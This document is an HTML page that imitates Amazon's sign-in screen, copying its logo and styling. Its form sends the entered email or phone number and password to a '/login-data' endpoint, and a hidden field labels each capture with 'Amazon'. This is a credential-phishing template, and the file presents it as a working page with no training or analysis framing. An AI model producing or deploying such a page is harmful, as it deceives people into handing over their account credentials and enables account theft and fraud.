<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Amazon Sign-In</title>
    <style>
        body {
            font-family: "Amazon Ember", Arial, sans-serif;
            background: #fff;
            margin: 0;
            display: flex;
            justify-content: center;
            padding-top: 20px;
        }
        .container {
            width: 350px;
            border: 1px solid #ddd;
            border-radius: 4px;
            padding: 20px 26px;
        }
        .logo {
            width: 103px;
            margin: 0 auto 10px;
            display: block;
        }
        h1 {
            font-weight: 400;
            font-size: 28px;
            margin-bottom: 10px;
        }
        label {
            font-weight: 700;
            font-size: 13px;
            padding-left: 2px;
            padding-bottom: 2px;
        }
        input {
            width: 100%;
            height: 31px;
            padding: 3px 7px;
            border: 1px solid #a6a6a6;
            border-radius: 3px;
            margin-top: 5px;
            margin-bottom: 15px;
            box-sizing: border-box;
            box-shadow: 0 1px 0 rgba(0,0,0,.07) inset;
        }
        input:focus {
            border-color: #e77600;
            box-shadow: 0 0 3px 2px rgb(228 121 17 / 50%);
            outline: 0;
        }
        button {
            width: 100%;
            height: 31px;
            background: #f0c14b;
            border-radius: 3px;
            border: 1px solid #a88734;
            cursor: pointer;
            background: linear-gradient(to bottom,#f7dfa5,#f0c14b);
        }
        button:hover {
            background: linear-gradient(to bottom,#f5d78e,#eeb933);
        }
    </style>
</head>
<body>
    <div class="container">
        <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg" alt="Amazon">
        <h1>Sign-In</h1>
        <form action="/login-data" method="post">
            <label for="username">Email or mobile phone number</label>
            <input type="text" id="username" name="username" required>
            
            <label for="password">Password</label>
            <input type="password" id="password" name="password" required>
            
            <!-- Hidden field to identify the service -->
            <input type="hidden" name="service" value="Amazon">
            
            <button type="submit">Continue</button>
        </form>
    </div>
</body>
</html>
